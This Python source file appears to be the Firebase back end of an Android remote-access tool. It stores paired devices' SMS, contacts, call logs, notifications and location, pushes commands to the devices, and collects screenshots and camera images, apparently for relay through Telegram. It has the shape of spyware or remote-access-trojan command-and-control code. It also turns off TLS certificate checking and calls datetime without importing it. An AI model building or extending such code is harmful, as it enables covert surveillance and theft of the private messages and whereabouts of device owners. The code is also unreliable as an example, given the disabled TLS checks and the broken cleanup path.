"""
Firebase Integration Module - TEXT/TABULAR DATA ONLY.
Used for: SMS, contacts, calls, notifications, device info, logs, pairing codes, user data.
NOT used for files/media - those go through the server's temporary file storage.
"""

import aiohttp
import json
import asyncio
import re
import time
import logging

from .config import FIREBASE_RTDB_URL, FIREBASE_DB_SECRET
from .store import store

logger = logging.getLogger("firebase")
_firebase_session: aiohttp.ClientSession = None
firebase_connected = False

async def init_session():
    global _firebase_session
    if _firebase_session is None or _firebase_session.closed:
        _firebase_session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=15),
            connector=aiohttp.TCPConnector(ssl=False)
        )

def _headers():
    h = {"Content-Type": "application/json"}
    if FIREBASE_DB_SECRET:
        h["auth"] = FIREBASE_DB_SECRET
    return h

def validate_id(id_str: str, name: str = "ID") -> str:
    """Sanitize Firebase path IDs to prevent injection."""
    if not id_str or not re.match(r'^[a-zA-Z0-9_\-]+$', str(id_str)):
        raise ValueError(f"Invalid {name}: {id_str}")
    return str(id_str)

async def check_connectivity() -> bool:
    global firebase_connected
    try:
        await init_session()
        async with _firebase_session.get(f"{FIREBASE_RTDB_URL}/.json", headers=_headers()) as resp:
            firebase_connected = resp.status == 200
            if firebase_connected:
                logger.info("Firebase connected")
            else:
                logger.warning(f"Firebase check returned {resp.status}")
            return firebase_connected
    except Exception as e:
        firebase_connected = False
        logger.error(f"Firebase connectivity failed: {e}")
        return False

async def get(path: str) -> any:
    """GET data from Firebase RTDB."""
    if not firebase_connected:
        return None
    try:
        await init_session()
        url = f"{FIREBASE_RTDB_URL}/{path}.json"
        async with _firebase_session.get(url, headers=_headers()) as resp:
            if resp.status == 200:
                return await resp.json()
            return None
    except Exception as e:
        logger.error(f"Firebase GET {path} failed: {e}")
        return None

async def set(path: str, data: any) -> bool:
    """SET (PUT) data in Firebase. If data is None, deletes the path."""
    try:
        await init_session()
        url = f"{FIREBASE_RTDB_URL}/{path}.json"
        if data is None:
            async with _firebase_session.delete(url, headers=_headers()) as resp:
                return resp.status in (200, 204)
        else:
            async with _firebase_session.put(url, headers=_headers(), json=data) as resp:
                return resp.status == 200
    except Exception as e:
        logger.error(f"Firebase SET {path} failed: {e}")
        return False

async def update(path: str, data: dict) -> bool:
    """PATCH partial update in Firebase."""
    try:
        await init_session()
        url = f"{FIREBASE_RTDB_URL}/{path}.json"
        async with _firebase_session.patch(url, headers=_headers(), json=data) as resp:
            return resp.status == 200
    except Exception as e:
        logger.error(f"Firebase UPDATE {path} failed: {e}")
        return False

async def push(path: str, data: dict) -> any:
    """POST (push) new data, returns the generated key."""
    try:
        await init_session()
        url = f"{FIREBASE_RTDB_URL}/{path}.json"
        async with _firebase_session.post(url, headers=_headers(), json=data) as resp:
            if resp.status == 200:
                result = await resp.json()
                return result.get("name")
            return None
    except Exception as e:
        logger.error(f"Firebase PUSH {path} failed: {e}")
        return None

async def remove(path: str) -> bool:
    """DELETE data at path."""
    return await set(path, None)

# ─── Text Data Storage Functions ──────────────────────────────

async def store_sms(device_id: str, sms_data: list):
    """Store SMS data for a device (text/tabular)."""
    did = validate_id(device_id, "device_id")
    await set(f"sms/{did}", sms_data)

async def store_contacts(device_id: str, contacts_data: list):
    """Store contacts for a device."""
    did = validate_id(device_id, "device_id")
    await set(f"contacts/{did}", contacts_data)

async def store_calls(device_id: str, calls_data: list):
    """Store call log for a device."""
    did = validate_id(device_id, "device_id")
    await set(f"calls/{did}", calls_data)

async def store_notifications(device_id: str, notif_data: list):
    """Store notifications for a device."""
    did = validate_id(device_id, "device_id")
    await set(f"notifications/{did}", notif_data)

async def store_device_info(device_id: str, info_data: dict):
    """Store device info."""
    did = validate_id(device_id, "device_id")
    await update(f"device_info/{did}", info_data)

async def store_logs(device_id: str, log_data: list):
    """Store device logs."""
    did = validate_id(device_id, "device_id")
    await set(f"logs/{did}", log_data)

async def store_location(device_id: str, location_data: dict):
    """Store latest location."""
    did = validate_id(device_id, "device_id")
    await set(f"location/{did}", location_data)

# ─── Permanent Code Sync ───────────────────────────────────

async def sync_permanent_code(email: str, code: str, user_id: str):
    """Store permanent link code in Firebase so Android app can look it up by email."""
    safe_email = email.lower().replace('.', '_').replace('@', '_at_')
    await update(f"permanent_codes/{safe_email}", {
        "code": code,
        "email": email,
        "user_id": user_id,
        "created_at": time.time(),
        "server_domain": "alsydyabwalzhra.online",
    })
    # Also store reverse mapping: code -> email
    await update(f"code_to_email/{code}", {
        "email": email,
        "user_id": user_id,
    })

# ─── Command Push via Firebase ────────────────────────────────

async def push_command(device_id: str, command: dict):
    """Push a command to Firebase for the device to pick up."""
    did = validate_id(device_id, "device_id")
    cmd_id = command.get('id', '')
    safe_cmd_id = validate_id(cmd_id, "command_id") if cmd_id else ''
    
    if safe_cmd_id:
        await set(f"commands/{did}/{safe_cmd_id}", command)
    else:
        await push(f"commands/{did}", command)

async def push_pairing_code(code: str, code_data: dict):
    """Store pairing code in Firebase."""
    safe_code = validate_id(code, "pairing_code")
    await set(f"link_codes/{safe_code}", code_data)

async def verify_link_code_firebase(code: str):
    """Check if pairing code exists and is valid in Firebase."""
    safe_code = validate_id(code, "pairing_code")
    return await get(f"link_codes/{safe_code}")

async def consume_link_code_firebase(code: str, device_id: str):
    """Mark pairing code as used in Firebase."""
    safe_code = validate_id(code, "pairing_code")
    await update(f"link_codes/{safe_code}", {
        "used": True,
        "used_at": time.time(),
        "device_id": device_id
    })

# ─── Result Listener ──────────────────────────────────────────

async def result_listener():
    """Poll Firebase for command results and process them."""
    while True:
        try:
            await asyncio.sleep(3)
            if not firebase_connected:
                continue
            
            # Check results for all active devices
            for device_id in list(store.devices.keys()):
                did = validate_id(device_id, "device_id")
                results = await get(f"results/{did}")
                if not results or not isinstance(results, dict):
                    continue
                
                for cmd_id, result_data in results.items():
                    dedup_key = f"{device_id}:{cmd_id}"
                    if dedup_key in store._processed_results:
                        continue
                    store._processed_results.add(dedup_key)
                    
                    # Process result
                    await store.update_command_result(cmd_id, "completed", result_data)
                    
                    # Forward to pending Telegram messages
                    for msg_id, msg_info in list(store.pending_messages.items()):
                        if msg_info.get('command_id') == cmd_id:
                            # Will be forwarded by Telegram module
                            pass
                    
                    # Clean up Firebase result
                    await remove(f"results/{did}/{cmd_id}")
                    
                    # Handle special results (screenshots, camera photos)
                    if isinstance(result_data, dict):
                        result_str = result_data.get('result', '')
                        if isinstance(result_str, str) and (result_str.startswith('/9j/') or len(result_str) > 10000):
                            # This is a base64 image - cache for streaming
                            store.latest_frames[f"{device_id}:video"] = {
                                "data": result_str,
                                "timestamp": time.time(),
                                "source": "screenshot",
                            }
                
                # Keep dedup set bounded
                if len(store._processed_results) > 500:
                    store._processed_results = set(list(store._processed_results)[-250:])
        
        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Result listener error: {e}")
            await asyncio.sleep(5)

# ─── Stale Data Cleanup ──────────────────────────────────────

async def cleanup_stale_commands():
    """Remove old commands from Firebase."""
    while True:
        try:
            await asyncio.sleep(60)
            if not firebase_connected:
                continue
            now = time.time()
            for device_id in list(store.devices.keys()):
                did = validate_id(device_id, "device_id")
                commands = await get(f"commands/{did}")
                if not commands or not isinstance(commands, dict):
                    continue
                for cmd_id, cmd_data in list(commands.items()):
                    created = cmd_data.get('created_at', 0)
                    if isinstance(created, str):
                        try:
                            created = datetime.fromisoformat(created).timestamp()
                        except:
                            created = 0
                    if now - created > 90:  # Older than 90 seconds
                        await remove(f"commands/{did}/{cmd_id}")
        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Stale commands cleanup error: {e}")
            await asyncio.sleep(30)

async def close():
    global _firebase_session
    if _firebase_session and not _firebase_session.closed:
        await _firebase_session.close()